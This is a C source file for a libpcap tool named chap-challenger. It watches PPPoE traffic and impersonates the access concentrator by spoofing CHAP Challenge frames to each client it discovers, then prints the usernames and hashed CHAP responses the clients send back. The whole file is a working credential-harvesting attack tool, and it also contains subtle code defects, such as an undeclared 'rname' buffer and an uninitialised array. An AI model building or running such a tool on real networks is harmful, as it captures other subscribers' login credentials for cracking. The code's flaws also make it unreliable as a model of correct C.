/*
 * chap-challenger v0.2 - send spoofed chap challenges in pppoe frames
 *
 * Copyright (c) 2008-2010, Tibor Bombiak
 *
 * You must compile this program against libpcap. Example:
 * 	gcc -o chap-challenger chap-challenger.c -lpcap
 *
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * chap-challenger is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses>.
 */

#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/ppp_defs.h>

#include "chap-challenger.h"

char* ether_ntoa(struct ether_addr *ea, char *buf)
{
	sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x",
		ea->ether_addr_octet[0]&0xff, ea->ether_addr_octet[1]&0xff, ea->ether_addr_octet[2]&0xff,
		ea->ether_addr_octet[3]&0xff, ea->ether_addr_octet[4]&0xff, ea->ether_addr_octet[5]&0xff);
	return (buf);
}

int ether_atoe(char *p, struct ether_addr *ea)
{
	int i = 0;

	for (;;) {
		ea->ether_addr_octet[i++] = (char) strtoul(p, &p, 16);
		if (!*p++ || i == ETHER_ADDR_LEN)
			break;
	}
	return (i == ETHER_ADDR_LEN);
}

int get_hwaddr(char *dev, struct ether_addr *ea)
{
	int s;
	struct ifreq ifr;

	if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
	{
		return 0;
	}

	strcpy(ifr.ifr_name, dev);

	if (ioctl(s, SIOCGIFHWADDR, &ifr) == -1)
	{
		close(s);
		return 0;
	}

	close(s);
	memcpy (ea, &ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	return 1;
}

int build_pkt(struct ether_addr *src, struct ether_addr *dst, u_char *ac_name, unsigned int sess_id, u_char id_prefix, PPPoEPacket *packet)
{
	unsigned char *cursor = packet->payload;
	unsigned int ppp_pktlen = CHAP_HEADERLEN + 1 + strlen(ac_name);

	/* Build PPPoE Encapsulation */
	memcpy (packet->ethHdr.h_source, src->ether_addr_octet, ETH_ALEN);
	memcpy (packet->ethHdr.h_dest, dst->ether_addr_octet, ETH_ALEN);
	packet->ethHdr.h_proto = htons(ETH_PPPOE_SESSION);
	packet->ver = 0x01;
	packet->type = 0x01;
	packet->code = CODE_SESS;
	packet->session = htons(sess_id);
	packet->length = htons(PPPOE_HEADERLEN + PPP_PROTOLEN + ppp_pktlen);

	/* Build CHAP Challenge payload */
	PUTSHORT(PPP_CHAP, cursor);
	PUTCHAR(CHAP_CHALLENGE, cursor);
	PUTCHAR(id_prefix, cursor);
	PUTSHORT(ppp_pktlen, cursor);
	PUTCHAR(0x00, cursor);
	memcpy(cursor, ac_name, strlen(ac_name));

	return (PPPOE_HEADERLEN + PPP_PROTOLEN + ppp_pktlen);
}

void usage(char const *argv0)
{
	fprintf(stdout, 
			"Usage: %s -i -a [-n] [-p]\n"
			"\t-i interface\t -- specify interface to use\n"
			"\t-a ac's mac\t -- access concentrator's mac\n"
			"\t[-n] ac's name\t -- access concentrator's name\n"
			"\t[-p] identifier\t -- identifier in challenge packets (hex)\n\n"
			"%s version %s, copyright(c) 2008 biegleux\n", argv0, argv0, VERSION);
	exit(1);
}

int main(int argc, char *argv[])
{
	int c, ret;
	struct ether_addr ac_hwaddr;	/* Access Concentrator's MAC address */
	struct ether_addr dev_hwaddr;	/* MAC address of interface we use */
	char *dev_name = NULL;		/* Interface to use */
	char *ac_name = NULL;		/* Access Concentrator's name */
	u_char aflag = 0x00;		/* Arguments flag */
	u_char id_prefix;		/* CHAP Identifier */

	pcap_t *fp;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program filter;
	char filter_exp[] = "pppoes";
	bpf_u_int32 mask, net;
	int res;
	struct pcap_pkthdr *pkt_header;
	const u_char *pkt_data;

	PPPoEPacket pkt, *packet;
	int pkt_len;

	u_char *inp;
	u_char code, id, val_size;
	int len;

	u_char buf[BUF_MAXLEN];		/* Buffer for MAC list */
	u_char rcv[MAX_STA_COUNT];
	struct maclist *maclist = (struct maclist *) buf;
	struct ether_addr *ea = maclist->ea;
	int mac_found, i;

	char *name = NULL;
	char uname[MAX_NAME_LEN + 1];
	unsigned char *response;

	while ((c = getopt (argc, argv, "i:a:n:p:h")) != -1)
		switch (c)
		{
		case 'i':
			dev_name = optarg;
			SETFLAG(aflag, I_FLG);
			break;
		case 'a':
			if (!ether_atoe(optarg, &ac_hwaddr))
			{
				fprintf(stderr, "Invalid mac address\n");
				return;
			}
			SETFLAG(aflag, A_FLG);
			break;
		case 'n':
			ac_name = optarg;
			break;
		case 'p':
			ret = sscanf(optarg, "%x", &id_prefix);
			if (ret != 1)
			{
				fprintf (stderr, "Invalid identifier\n");
				return;
			}
			break;
		case 'h':
			usage(argv[0]);
			break;
		default:
			usage(argv[0]);
		}

	/* Check the validity of the command line */
	if (!GETFLAG(aflag, I_FLG) || !GETFLAG(aflag, A_FLG))
		usage(argv[0]);

	/* Getting MAC address */
	if (!get_hwaddr(dev_name, &dev_hwaddr))
	{
		fprintf(stderr, "Unable to obtain MAC address for device %s\n", dev_name);
		return;
	}

	/* Open the output adapter */
	if ((fp = pcap_open_live(dev_name, 1024, 1, 1000, errbuf)) == NULL)
	{
		fprintf(stderr, "Error opening adapter: %s:\n", errbuf);
		return;
	}

	if (pcap_lookupnet(dev_name, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Can't get netmask for device %s: %s\n", dev_name, pcap_geterr(fp));
		net = 0;
		mask = 0;
	}

	if (pcap_compile(fp, &filter, filter_exp, 0, net) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(fp));
		return;
	}

	if (pcap_setfilter(fp, &filter) == -1)
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(fp));
		return;
	}

	/* Start capturing */
	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
	{
		if (res == 0)
			/* Timeout elapsed */
			continue;

		packet = (PPPoEPacket *)(pkt_data);

		inp = (u_char *)(packet) + PPPOE_HEADERLEN + PPP_PROTO_LEN;

		GETCHAR(code, inp);
		GETCHAR(id, inp);
		GETSHORT(len, inp);

		if (memcmp(packet->ethHdr.h_source, &ac_hwaddr, ETH_ALEN) == 0)
		{
			/* Read challenge packets until we get AC's name */
			if (ac_name != NULL || code != CHAP_CHALLENGE)
				continue;

			GETSHORT(val_size, inp);
			INCPTR(val_size, inp);
			len -= (CHAP_HEADERLEN + 1 + val_size);
			if ((ac_name = (char *) malloc(len + 1)) == NULL)
			{
				fprintf(stderr, "There is not enough memory\n");
				pcap_close(fp);
				return;
			};
			memcpy(ac_name, inp, len);
			continue;
		}

		if (memcmp(packet->ethHdr.h_dest, &ac_hwaddr, ETH_ALEN) != 0)
			/* Skip all traffic not travelling through AC */
			continue;

		if (memcmp(packet->ethHdr.h_source, &dev_hwaddr, ETH_ALEN) == 0)
			/* Ignore packets somehow related to me */
			continue;

		mac_found = 0;
		ea = maclist->ea;
		for (i = 0; i < maclist->count; i++)
		{
			if (memcmp(ea, packet->ethHdr.h_source, ETH_ALEN) == 0)
			{
				mac_found++;
				break;
			}
			ea++;
		}

		if (!mac_found)
		{
			if (maclist->count == MAX_STA_COUNT)
			{
				fprintf(stderr, "Reached maximum number of concurrently registered stations\n");
				continue;
			}

			memcpy(ea, packet->ethHdr.h_source, ETH_ALEN);
			maclist->count++;

			fprintf(stdout, "Discovered client - [%02x:%02x:%02x:%02x:%02x:%02x]\n",
						ea->ether_addr_octet[0], ea->ether_addr_octet[1], ea->ether_addr_octet[2],
						ea->ether_addr_octet[3], ea->ether_addr_octet[4], ea->ether_addr_octet[5]);

			if (ac_name == NULL)
				continue;

			/* Build CHAP Challenge packet */
			pkt_len = build_pkt(&ac_hwaddr, ea, ac_name, packet->session, id_prefix, &pkt);

			fprintf(stdout, "Sending challenge to [%02x:%02x:%02x:%02x:%02x:%02x]...",
						ea->ether_addr_octet[0], ea->ether_addr_octet[1], ea->ether_addr_octet[2],
						ea->ether_addr_octet[3], ea->ether_addr_octet[4], ea->ether_addr_octet[5]);

			/* Send down the packet */
			if (pcap_sendpacket(fp, (unsigned char *) &pkt, pkt_len) != 0)
			{
				fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(fp));
				continue;
			}

			fprintf(stdout, "Done\n");
		}
		else
		{
			if (ac_name == NULL || rcv[i] != 0)
				continue;

			if (code == CHAP_RESPONSE && id == id_prefix)
			{
				/* Most probably it is response to our challenge */
				rcv[i]++; // pozor z jednej mac moze bezat viacero pppoe sessions (sess je definovana id a mac adresami)
				GETSHORT (val_size, inp);
				response = inp;
				len -= (CHAP_HEADERLEN + 1 + val_size);
				name = (char *)inp + val_size;

				if (len < 0)
					continue;

				if (len > MAX_NAME_LEN)
				{
					fprintf(stderr, "Username too long\n");
					continue;
				}

				snprintf(rname, len + 1, "%s", name);

				fprintf(stdout, "Response from [%02x:%02x:%02x:%02x:%02x:%02x]: %s - ",
							packet->ethHdr.h_source[0], packet->ethHdr.h_source[1], packet->ethHdr.h_source[2],
							packet->ethHdr.h_source[3], packet->ethHdr.h_source[4], packet->ethHdr.h_source[5], rname);

				/* Output response in hex */
				for (i = 0; i < val_size; i++)
				{
					fprintf(stdout, "%02x", response[i]);
				}
				fprintf(stdout, "\n");
			}
			else
			{
				/* Build CHAP Challenge packet */
				ea = (struct ether_addr *)packet->ethHdr.h_source;
				pkt_len = build_pkt(&ac_hwaddr, ea, ac_name, packet->session, id_prefix, &pkt);

				fprintf(stdout, "Sending challenge to [%02x:%02x:%02x:%02x:%02x:%02x]...",
							ea->ether_addr_octet[0], ea->ether_addr_octet[1], ea->ether_addr_octet[2],
							ea->ether_addr_octet[3], ea->ether_addr_octet[4], ea->ether_addr_octet[5]);

				/* Send down the packet */
				if (pcap_sendpacket(fp, (unsigned char *) &pkt, pkt_len) != 0)
				{
					fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(fp));
					continue;
				}

				fprintf(stdout, "Done\n");
			}
		}
	}
	pcap_close(fp);
}
